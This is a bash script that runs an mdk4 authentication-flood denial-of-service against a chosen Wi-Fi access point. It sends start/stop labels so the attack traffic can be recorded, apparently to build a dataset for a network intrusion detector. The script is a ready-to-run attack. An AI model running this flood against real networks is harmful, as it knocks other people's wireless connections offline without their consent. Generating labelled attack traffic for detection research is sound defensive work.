#!/usr/bin/env bash
# Auth flood + labeling (Kali / monitor mode).
# Usage: sudo -E ./host/attacks/attack_auth_flood.sh
#
# mdk4 mode a (Authentication DoS) — what worked on Winston's fixed AP.
# Do not hardcode BSSID/channel; same env / airodump / live_state path as deauth.
# Hotspot AUTH subtype was nearly flat with aireplay -1; keep that as history.
set -euo pipefail
DIR="$(cd "$(dirname "$0")" && pwd)"
# shellcheck source=netconfig.sh
source "${DIR}/netconfig.sh"

LABEL_SENT=0
_cleanup_label() {
  if [[ "${LABEL_SENT}" -eq 1 ]]; then
    echo ">>> cleanup: sending STOP AUTH_FLOOD" >&2
    send_label STOP AUTH_FLOOD || true
    LABEL_SENT=0
  fi
}
trap _cleanup_label EXIT

if ! command -v mdk4 >/dev/null 2>&1; then
  echo ">>> ERROR: mdk4 not found. apt install mdk4" >&2
  exit 1
fi

if ! ip link show "$MON_IFACE" >/dev/null 2>&1; then
  _alt="$(iw dev 2>/dev/null | awk '/^[[:space:]]*Interface /{iface=$2} /^[[:space:]]*type monitor/{print iface; exit}')"
  if [[ -n "${_alt:-}" ]]; then
    MON_IFACE="$_alt"
    export NIDS_MON_IFACE="$_alt"
  else
    bash "${DIR}/prepare_wifi.sh" monitor
    MON_IFACE="${NIDS_MON_IFACE:-$MON_IFACE}"
  fi
fi
if ! ip link show "$MON_IFACE" >/dev/null 2>&1; then
  echo ">>> ERROR: no monitor iface" >&2
  exit 1
fi

ensure_label_path || exit 1

BSSID=""
CHANNEL=""
if [[ -n "${NIDS_BSSID:-}" ]]; then
  BSSID="$NIDS_BSSID"
  CHANNEL="${NIDS_WIFI_CHANNEL:-$(_json_field channel 2>/dev/null || true)}"
  echo ">>> Using forced NIDS_BSSID=${BSSID}"
elif [[ "${NIDS_SKIP_AP_SCAN:-0}" != "1" ]] && hit="$(airodump_find_ap "$MON_IFACE" "$SSID")"; then
  BSSID="${hit%% *}"
  CHANNEL="${hit##* }"
  export NIDS_BSSID="$BSSID"
  export NIDS_WIFI_CHANNEL="$CHANNEL"
else
  BSSID="$(resolve_bssid)" || {
    echo ">>> Could not resolve BSSID. Export NIDS_BSSID=.." >&2
    exit 1
  }
  CHANNEL="${NIDS_WIFI_CHANNEL:-$(_json_field channel 2>/dev/null || true)}"
fi

DURATION="${NIDS_AUTH_FLOOD_SEC:-60}"
PPS="${NIDS_AUTH_FLOOD_PPS:-}"

if [[ -n "${CHANNEL:-}" && "$CHANNEL" != "null" && "$CHANNEL" != "0" ]]; then
  iw dev "$MON_IFACE" set channel "$CHANNEL" 2>/dev/null \
    || iwconfig "$MON_IFACE" channel "$CHANNEL" 2>/dev/null || true
fi

echo ">>> Monitor iface    : $MON_IFACE"
echo ">>> AP BSSID         : $BSSID"
echo ">>> Channel          : ${CHANNEL:-?}"
echo ">>> Duration         : ${DURATION}s"
echo ">>> Label host       : $(get_label_host):${LABEL_PORT}"
echo ">>> READY FOR AUTH_FLOOD"

send_label START AUTH_FLOOD
LABEL_SENT=1
sleep 0.5

set +e
# -s INT: mdk4 often ignores SIGTERM; Winston's run used this.
if [[ -n "${PPS}" ]]; then
  echo ">>> mdk4 a -a ${BSSID} -s ${PPS}"
  timeout -s INT "$DURATION" mdk4 "$MON_IFACE" a -a "$BSSID" -s "$PPS"
else
  echo ">>> mdk4 a -a ${BSSID}"
  timeout -s INT "$DURATION" mdk4 "$MON_IFACE" a -a "$BSSID"
fi
rc=$?
set -e

if [[ "$rc" -eq 124 ]]; then
  echo ">>> mdk4 finished rc=124 (duration OK)"
elif [[ "$rc" -eq 0 ]]; then
  echo ">>> mdk4 finished rc=0"
else
  echo ">>> WARN: mdk4 rc=${rc} — check this labeled slice" >&2
fi

sleep 1
send_label STOP AUTH_FLOOD
LABEL_SENT=0
echo " >>> AUTH_FLOOD FINISHED"
echo " >>> Next: sudo -E ./host/attacks/prepare_wifi.sh managed"
